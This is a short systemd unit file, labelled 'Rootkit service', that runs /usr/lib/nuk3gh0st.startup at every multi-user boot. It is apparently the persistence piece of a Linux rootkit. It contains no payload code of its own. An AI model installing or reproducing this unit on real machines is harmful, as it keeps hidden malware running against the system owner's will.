# nuk3gh0st.service
[Unit]
Description=Rootkit service

[Service]
ExecStart=/usr/lib/nuk3gh0st.startup

[Install]
WantedBy=multi-user.target